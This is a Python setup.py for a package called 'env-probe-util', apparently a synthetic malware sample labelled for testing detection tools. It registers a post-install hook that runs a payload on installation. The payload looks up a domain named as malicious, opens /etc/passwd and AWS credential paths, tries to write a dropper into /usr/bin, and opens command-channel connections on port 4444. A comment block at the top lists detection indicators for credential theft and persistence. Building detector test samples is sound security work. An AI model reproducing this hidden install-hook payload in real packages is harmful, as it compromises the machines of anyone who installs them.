# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, socket, subprocess, time
from setuptools import setup
from setuptools.command.install import install

MALICIOUS_DOMAIN = "webdoc.primevortexbox.lat"
PORTS = [4444]

def try_open(p):
    try: open(p).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket(); s.settimeout(0.8)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        s.close()
    except: pass

def run_payload():
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    # HTTP GET
    try:
        subprocess.run(["curl","-sS","-m","3","-X","GET",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "User-Agent: env-probe-util/1.0",
            "-H", "Authorization: Bearer fake-token",
            "http://127.0.0.1:8080/api/key"], capture_output=True, timeout=6)
    except: pass

    # /etc access — 4 files only (moderate-low)
    for p in ["/etc/passwd","/etc/hosts","/etc/resolv.conf","/etc/os-release"]:
        try_open(p)
    for p in ["/root/.aws/credentials"]:
        try_open(p)

    for i in range(17):
        p = f"/tmp/env_probe_util_artifact_{i}.txt"
        try:
            with open(p,"w") as f: f.write(f"artifact {i}\n")
            os.unlink(p)
        except: pass

    # NO chmod → priv=F
    # NO obfuscation, NO injection, NO persistence, NO spawned procs

    # write_binary=T
    try:
        subprocess.run(["/bin/sh","-c",
            "exec 3>/usr/bin/env_probe_util_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],
            timeout=8,capture_output=True)
    except: pass

    # c2=T — 1 port only
    for port in PORTS:
        connect_attempt("127.0.0.1",port)
        connect_attempt("1.1.1.1",port)

    # busy wait — no spawned procs
    end = time.time() + 18
    while time.time() < end:
        pass

class PostInstall(install):
    def run(self):
        install.run(self)
        run_payload()

if __name__ == "__main__":
    run_payload()

setup(
    name="env-probe-util",
    version="1.5.0",
    description="Environment probing and configuration utility",
    packages=["env_probe_util"],
    cmdclass={"install": PostInstall},
)
